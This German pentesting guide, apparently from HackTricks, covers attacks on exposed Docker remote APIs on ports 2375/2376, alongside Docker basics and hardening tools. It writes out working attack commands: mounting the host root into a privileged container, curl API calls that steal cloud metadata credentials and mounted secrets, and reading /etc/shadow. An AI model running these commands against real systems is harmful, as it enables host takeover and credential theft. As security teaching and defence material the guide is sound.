# 2375, 2376 Pentesting Docker

{{#include ../banners/hacktricks-training.md}}

### Docker Grundlagen

#### Was ist

Docker ist die **führende Plattform** in der **Containerisierungsbranche**, die **kontinuierliche Innovation** vorantreibt. Es erleichtert die mühelose Erstellung und Verteilung von Anwendungen, die von **traditionell bis futuristisch** reichen, und gewährleistet deren **sichere Bereitstellung** in verschiedenen Umgebungen.

#### Grundlegende Docker-Architektur

- [**containerd**](http://containerd.io): Dies ist eine **Kernlaufzeit** für Container, die mit dem umfassenden **Management des Lebenszyklus eines Containers** betraut ist. Dies umfasst die Handhabung von **Bildübertragung und -speicherung** sowie die Überwachung der **Ausführung, Überwachung und Vernetzung** von Containern. **Detailliertere Einblicke** in containerd werden **weiter erkundet**.
- Der **container-shim** spielt eine entscheidende Rolle als **Vermittler** bei der Handhabung von **headless containers** und übernimmt nahtlos von **runc**, nachdem die Container initialisiert wurden.
- [**runc**](http://runc.io): Geschätzt für seine **leichte und universelle Containerlaufzeit**-Fähigkeiten, ist runc mit dem **OCI-Standard** konform. Es wird von containerd verwendet, um **Container zu starten und zu verwalten** gemäß den **OCI-Richtlinien**, nachdem es sich aus dem ursprünglichen **libcontainer** entwickelt hat.
- [**grpc**](http://www.grpc.io) ist entscheidend für die **Erleichterung der Kommunikation** zwischen containerd und der **docker-engine**, um eine **effiziente Interaktion** zu gewährleisten.
- Die [**OCI**](https://www.opencontainers.org) ist entscheidend für die Aufrechterhaltung der **OCI-Spezifikationen** für Laufzeiten und Bilder, wobei die neuesten Docker-Versionen **konform mit den OCI-Bild- und Laufzeitstandards** sind.

#### Grundlegende Befehle
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** wurde speziell entwickelt, um die Bedürfnisse von Containerplattformen wie **Docker und Kubernetes** zu bedienen. Es zielt darauf ab, **die Ausführung von Containern** über verschiedene Betriebssysteme hinweg zu vereinfachen, einschließlich Linux, Windows, Solaris und mehr, indem es betriebssystemspezifische Funktionen und Systemaufrufe abstrahiert. Das Ziel von Containerd ist es, nur die wesentlichen Funktionen einzuschließen, die von seinen Benutzern benötigt werden, und unnötige Komponenten zu vermeiden. Es wird jedoch anerkannt, dass es eine Herausforderung ist, dieses Ziel vollständig zu erreichen.

Eine wichtige Designentscheidung ist, dass **Containerd kein Networking** behandelt. Networking wird als ein kritisches Element in verteilten Systemen betrachtet, mit Komplexitäten wie Software Defined Networking (SDN) und Dienstentdeckung, die von Plattform zu Plattform erheblich variieren. Daher überlässt Containerd die Netzwerkaspekte den Plattformen, die es unterstützt.

Während **Docker Containerd nutzt**, um Container auszuführen, ist es wichtig zu beachten, dass Containerd nur eine Teilmenge der Funktionen von Docker unterstützt. Insbesondere fehlen Containerd die Netzwerkmanagementfähigkeiten, die in Docker vorhanden sind, und es unterstützt nicht die direkte Erstellung von Docker-Schwärmen. Diese Unterscheidung hebt die fokussierte Rolle von Containerd als Container-Laufzeitumgebung hervor, die spezialisiertere Funktionen an die Plattformen delegiert, mit denen es integriert ist.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** ist eine Open-Source-Container-Engine, die den [Open Container Initiative (OCI) Standards](https://github.com/opencontainers) entspricht und von Red Hat entwickelt und gepflegt wird. Es hebt sich von Docker durch mehrere distinct Merkmale ab, insbesondere durch seine **daemonlose Architektur** und die Unterstützung für **rootlose Container**, die es Benutzern ermöglicht, Container ohne Root-Rechte auszuführen.

Podman ist so konzipiert, dass es mit der Docker-API kompatibel ist, was die Verwendung von Docker-CLI-Befehlen ermöglicht. Diese Kompatibilität erstreckt sich auf sein Ökosystem, das Tools wie **Buildah** zum Erstellen von Container-Images und **Skopeo** für Bildoperationen wie Push, Pull und Inspect umfasst. Weitere Details zu diesen Tools finden Sie auf ihrer [GitHub-Seite](https://github.com/containers/buildah/tree/master/docs/containertools).

**Wesentliche Unterschiede**

- **Architektur**: Im Gegensatz zum Client-Server-Modell von Docker mit einem Hintergrund-Daemon arbeitet Podman ohne Daemon. Dieses Design bedeutet, dass Container mit den Rechten des Benutzers ausgeführt werden, der sie startet, was die Sicherheit erhöht, da Root-Zugriff nicht erforderlich ist.
- **Systemd-Integration**: Podman integriert sich mit **systemd**, um Container zu verwalten, was die Containerverwaltung über systemd-Einheiten ermöglicht. Dies steht im Gegensatz zur Verwendung von systemd durch Docker, das hauptsächlich zur Verwaltung des Docker-Daemon-Prozesses dient.
- **Rootlose Container**: Ein entscheidendes Merkmal von Podman ist die Fähigkeit, Container unter den Rechten des initiierenden Benutzers auszuführen. Dieser Ansatz minimiert die Risiken im Zusammenhang mit Containerverletzungen, indem sichergestellt wird, dass Angreifer nur die Rechte des kompromittierten Benutzers erlangen und nicht den Root-Zugriff.

Der Ansatz von Podman bietet eine sichere und flexible Alternative zu Docker, die das Management von Benutzerrechten und die Kompatibilität mit bestehenden Docker-Workflows betont.

> [!NOTE]
> Beachten Sie, dass Podman darauf abzielt, die gleiche API wie Docker zu unterstützen, sodass Sie die gleichen Befehle mit Podman wie mit Docker verwenden können, wie zum Beispiel:
>
> ```bash
> podman --version
> podman info
> pdoman images ls
> podman ls
> ```

### Grundinformationen

Die Remote-API läuft standardmäßig auf Port 2375, wenn sie aktiviert ist. Der Dienst erfordert standardmäßig keine Authentifizierung, was es einem Angreifer ermöglicht, einen privilegierten Docker-Container zu starten. Durch die Verwendung der Remote-API kann man Hosts / (Wurzelverzeichnis) an den Container anhängen und Dateien der Umgebung des Hosts lesen/schreiben.

**Standardport:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Aufzählung

#### Manuell

Beachten Sie, dass Sie zur Aufzählung der Docker-API den Befehl `docker` oder `curl` verwenden können, wie im folgenden Beispiel:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Wenn Sie **die Remote-Docker-API mit dem `docker`-Befehl kontaktieren können**, können Sie **jede der** **docker** [**Befehle, die zuvor** kommentiert wurden](2375-pentesting-docker.md#basic-commands) ausführen, um mit dem Dienst zu interagieren.

> [!NOTE]
> Sie können `export DOCKER_HOST="tcp://localhost:2375"` verwenden und **vermeiden**, den `-H`-Parameter mit dem Docker-Befehl zu verwenden.

**Schnelle Privilegieneskalation**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Manchmal sehen Sie **2376** für den **TLS**-Endpunkt. Ich konnte mich nicht mit dem Docker-Client damit verbinden, aber es ist möglich, dies mit curl zu tun.
```bash
#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Wenn Sie weitere Informationen dazu wünschen, sind weitere Informationen verfügbar, wo ich die Befehle herkopiert habe: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Automatisch
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Kompromittierung

Auf der folgenden Seite finden Sie Möglichkeiten, um **aus einem Docker-Container zu entkommen**:

{{#ref}}
../linux-hardening/privilege-escalation/docker-security/
{{#endref}}

Durch den Missbrauch dessen ist es möglich, aus einem Container zu entkommen. Sie könnten einen schwachen Container auf der Remote-Maschine ausführen, von ihm entkommen und die Maschine kompromittieren:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Privilegienerweiterung

Wenn Sie sich auf einem Host befinden, der Docker verwendet, können Sie [**diese Informationen lesen, um zu versuchen, die Privilegien zu erhöhen**](../linux-hardening/privilege-escalation/index.html#writable-docker-socket).

### Geheimnisse in laufenden Docker-Containern entdecken
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Überprüfen Sie **env** (Abschnitt der Umgebungsvariablen) auf Geheimnisse und Sie könnten finden:

- Passwörter.
- IPs.
- Ports.
- Pfade.
- Andere… .

Wenn Sie eine Datei extrahieren möchten:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Sicherung Ihres Docker

#### Sicherung der Docker-Installation und -Nutzung

- Sie können das Tool [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) verwenden, um Ihre aktuelle Docker-Installation zu überprüfen.
- `./docker-bench-security.sh`
- Sie können das Tool [https://github.com/kost/dockscan](https://github.com/kost/dockscan) verwenden, um Ihre aktuelle Docker-Installation zu überprüfen.
- `dockscan -v unix:///var/run/docker.sock`
- Sie können das Tool [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) verwenden, um die Berechtigungen zu überprüfen, die ein Container hat, wenn er mit verschiedenen Sicherheitsoptionen ausgeführt wird. Dies ist nützlich, um die Auswirkungen der Verwendung einiger Sicherheitsoptionen beim Ausführen eines Containers zu kennen:
- `docker run --rm -it r.j3ss.co/amicontained`
- `docker run --rm -it --pid host r.j3ss.co/amicontained`
- `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Sicherung von Docker-Images

- Sie können ein Docker-Image von [https://github.com/quay/clair](https://github.com/quay/clair) verwenden, um Ihre anderen Docker-Images zu scannen und Schwachstellen zu finden.
- `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
- `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Sicherung von Dockerfiles

- Sie können das Tool [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) verwenden, um **Ihr Dockerfile zu inspizieren** und alle Arten von Fehlkonfigurationen zu finden. Jede Fehlkonfiguration erhält eine ID, die Sie hier finden können [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md), um jede von ihnen zu beheben.
- `dockerfilelinter -f Dockerfile`

![](<../images/image (176).png>)

- Sie können das Tool [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) verwenden, um **Ihr Dockerfile zu inspizieren** und alle Arten von Fehlkonfigurationen zu finden.
- `dockerfilelint Dockerfile`

![](<../images/image (212).png>)

- Sie können das Tool [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) verwenden, um **Ihr Dockerfile zu inspizieren** und alle Arten von Fehlkonfigurationen zu finden.
- `dockerlint Dockerfile`

![](<../images/image (71).png>)

- Sie können das Tool [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) verwenden, um **Ihr Dockerfile zu inspizieren** und alle Arten von Fehlkonfigurationen zu finden.
- `hadolint Dockerfile`

![](<../images/image (501).png>)

#### Protokollierung verdächtiger Aktivitäten

- Sie können das Tool [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) verwenden, um **verdächtiges Verhalten in laufenden Containern zu erkennen**.
- Beachten Sie im folgenden Abschnitt, wie **Falco ein Kernel-Modul kompiliert und einfügt**. Danach lädt es die Regeln und **beginnt mit der Protokollierung verdächtiger Aktivitäten**. In diesem Fall hat es 2 privilegierte Container erkannt, die gestartet wurden, einen davon mit einer sensiblen Einbindung, und nach einigen Sekunden wurde erkannt, wie eine Shell in einem der Container geöffnet wurde.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Überwachung von Docker

Sie können auditd verwenden, um Docker zu überwachen.

### Referenzen

- [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
- [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

{{#include ../banners/hacktricks-training.md}}
